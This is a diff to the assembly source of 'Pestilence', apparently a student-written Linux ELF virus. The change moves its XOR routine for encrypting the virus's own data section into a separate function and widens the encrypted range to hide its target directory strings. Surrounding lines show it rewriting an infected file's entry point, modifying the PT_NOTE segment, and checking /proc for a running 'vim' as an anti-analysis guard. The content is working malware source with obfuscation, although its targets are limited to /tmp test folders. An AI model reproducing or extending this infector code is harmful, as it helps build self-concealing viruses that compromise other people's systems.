@@ -133,6 +133,28 @@ section .text
         ret
     __F_crazy__end:
 
+    __F_encrypt_data:
+        lea r10, [rel __F_data]         ; base función
+        mov rbx, 0x2537683570773774
+        mov rax, 0x0404040404040404
+        xor rbx, rax
+
+        xor rcx, rcx                    ; contador función
+        xor rdx, rdx                    ; índice key
+
+        .encrypt_data_loop:
+            mov r8b, [r10 + rcx]
+            mov r9b, bl
+            xor r8b, r9b
+            mov [r10 + rcx], r8b
+
+            ror rbx, 8
+            inc rcx
+            cmp rcx, (__F_data__end - __F_data)
+            jl .encrypt_data_loop
+        ret
+    __F_encrypt_data__end:
+
 ; ----------------------------------------------------------------------------------------------------------------------
 
     _init:
@@ -568,27 +590,9 @@ section .text
 
     .mod_pt_note:
         CALL_ENCRYPT(mod_pt_note)
+        CALL_ENCRYPT(encrypt_data)
 
         ; Encriptar data
-    .encrypt_data: 
-        lea r10, [rel __F_data]         ; base función
-        mov rbx, 0x2537683570773774
-        mov rax, 0x0404040404040404 
-        xor rbx, rax
-
-        xor rcx, rcx                    ; contador función
-        xor rdx, rdx                    ; índice key
-
-    .encrypt_data_loop:
-        mov r8b, [r10 + rcx]
-        mov r9b, bl
-        xor r8b, r9b
-        mov [r10 + rcx], r8b
-
-        ror rbx, 8
-        inc rcx
-        cmp rcx, (__F_data__end - __F_data)
-        jl .encrypt_data_loop       
     
     .write_payload:
         lea rsi, _start
@@ -612,7 +616,7 @@ section .text
         mov rbx, VAR(Pestilence.new_entry)
         mov [rax + Elf64_Ehdr.e_entry], rbx
 
-
+        CALL_ENCRYPT(encrypt_data)
 
     .munmap:
         ;munmap(map_ptr, len)
@@ -669,9 +673,9 @@ section .text
     status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
     forbidden_prog  db      0x2F,0x76,0x69,0x6D,0 ;"/vim",0  4
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
-    __F_data__end:
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
     proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
+    __F_data__end:
     Traza_position  equ     _finish - Traza
     Traza           db      "Pestilence version 1.0 (c)oded by tomartin & carce-bo",0  ;54
     host_entrypoint dq      _dummy_host_entrypoint
